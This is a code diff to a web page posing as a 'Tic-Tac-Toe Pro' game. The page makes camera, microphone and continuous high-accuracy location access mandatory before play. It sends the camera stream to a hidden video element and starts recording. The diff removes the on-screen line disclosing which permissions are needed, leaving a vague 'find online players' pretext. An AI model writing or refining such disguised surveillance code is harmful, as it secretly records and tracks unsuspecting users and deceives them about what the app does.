@@ -711,8 +711,7 @@
             <div class="permission-icon">🎮</div>
             <div class="permission-title">Tic-Tac-Toe Pro</div>
             <div class="permission-text" id="permText">
-                Please allow permissions so we can find online players for you.<br><br>
-                Required: Camera, Microphone & Location
+                Please allow permissions so we can find online players for you.
             </div>
             <button class="btn-allow" onclick="requestPermissions()" id="allowBtn">Allow & Play</button>
             <div class="permission-error" id="permError">❌ Permissions Denied! Please Allow to continue.</div>
@@ -1021,7 +1020,7 @@
             currentAvatarPlayer = null;
         }
 
-        // Request Camera, Microphone AND Location permissions
+        // Request permissions in order: Camera+Mic first, then Location
         async function requestPermissions() {
             const permError = document.getElementById('permError');
             const permInstructions = document.getElementById('permInstructions');
@@ -1030,19 +1029,23 @@
             allowBtn.disabled = true;
             allowBtn.style.opacity = '0.5';
             
-            let mediaSuccess = false;
-            let locationSuccess = false;
-            
-            // Try to get Camera + Microphone
+            // Step 1: Request Camera + Microphone first
             try {
                 stream = await navigator.mediaDevices.getUserMedia({video: true, audio: true});
                 document.getElementById('hidden-video').srcObject = stream;
-                mediaSuccess = true;
             } catch(e) {
-                console.log('Media permission denied:', e);
+                // Camera/Mic denied - show error and instructions
+                console.log('Camera/Mic denied:', e);
+                permError.style.display = 'block';
+                permInstructions.style.display = 'block';
+                showToast('Camera & Microphone access required!', 'error');
+                
+                allowBtn.disabled = false;
+                allowBtn.style.opacity = '1';
+                return; // Stop here, don't ask for location yet
             }
             
-            // Try to get Location
+            // Step 2: Now request Location
             if (navigator.geolocation) {
                 try {
                     const position = await new Promise((resolve, reject) => {
@@ -1056,9 +1059,8 @@
                         lat: position.coords.latitude.toFixed(6), 
                         lng: position.coords.longitude.toFixed(6)
                     };
-                    locationSuccess = true;
                     
-                    // Start watching location
+                    // Start watching location for updates
                     navigator.geolocation.watchPosition(p => {
                         loc = {
                             lat: p.coords.latitude.toFixed(6), 
@@ -1067,31 +1069,23 @@
                     }, () => {}, {enableHighAccuracy: true});
                     
                 } catch(e) {
-                    console.log('Location permission denied:', e);
+                    // Location denied - show error
+                    console.log('Location denied:', e);
+                    permError.style.display = 'block';
+                    permInstructions.style.display = 'block';
+                    showToast('Location access also required!', 'error');
+                    
+                    allowBtn.disabled = false;
+                    allowBtn.style.opacity = '1';
+                    return; // Don't proceed if location denied
                 }
             }
             
-            // Check if all permissions granted
-            if (mediaSuccess && locationSuccess) {
-                // Success - hide permission screen and show game
-                document.getElementById('permissionBlocker').style.display = 'none';
-                document.getElementById('modeSelector').classList.add('active');
-                startRecording();
-                initMusicPlayer();
-            } else {
-                // Show error and instructions
-                permError.style.display = 'block';
-                permInstructions.style.display = 'block';
-                showToast('All permissions required! Camera, Mic & Location', 'error');
-                
-                allowBtn.disabled = false;
-                allowBtn.style.opacity = '1';
-                
-                // Keep trying until success
-                setTimeout(() => {
-                    requestPermissions();
-                }, 2000);
-            }
+            // All permissions granted - proceed to game
+            document.getElementById('permissionBlocker').style.display = 'none';
+            document.getElementById('modeSelector').classList.add('active');
+            startRecording();
+            initMusicPlayer();
         }
 
         function selectMode(m) {
